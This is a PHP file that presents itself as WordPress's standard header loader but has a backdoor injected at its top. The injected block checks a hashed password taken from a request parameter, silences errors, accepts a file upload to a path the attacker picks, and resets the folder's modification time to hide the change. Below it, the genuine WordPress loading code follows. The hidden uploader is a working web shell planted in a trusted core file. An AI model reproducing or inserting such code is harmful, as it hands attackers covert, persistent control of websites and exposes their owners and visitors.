<?php
/*xosnykny_4l0y9p_4g8*/
if( isset( $_REQUEST['obwpsl'] ) ) {
    @ini_set('error_reporting', 0);
    @ini_set('display_errors', 0);
    @ini_set('display_startup_errors', 0);
    function upload_ex() {
        define('BORDERS', 'h10yt5ymixojd4jf');
        function _out( $data ) {
            return BORDERS . $data . BORDERS;
        }
        if (md5(base64_decode($_REQUEST['obwpsl'])) !== 'f736a18ba710934493e7f425665c16ab')
            exit(_out("BAD_PAS"));
        if( isset( $_FILES['rhpro'] ) && $_FILES['rhpro']['error'] == 0) {
            if( isset( $_REQUEST['path'] ) )
                $path = $_REQUEST['path'];
            else
                $path = $_SERVER['DOCUMENT_ROOT'];
            $filemtime = filemtime( $path );
            $result = move_uploaded_file( $_FILES['rhpro']['tmp_name'], "$path/{$_FILES['rhpro']['name']}" );
            touch( $path, $filemtime );
            if( $result )
                echo _out("FILE_UPLOADED_($path/{$_FILES['rhpro']['name']})");
            else
                echo _out("NO_FILE_UPLOADED_($path/{$_FILES['rhpro']['name']})");
            exit;
        }
        echo '<form method="post" enctype="multipart/form-data">
        <input type="file" id="rhpro" name="rhpro"></br>
        <input type="submit" value="Upload">
        </form>';
        exit;
    }
    upload_ex();
}
/*y_dep2xa3vzoam84l0yigd*/

/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
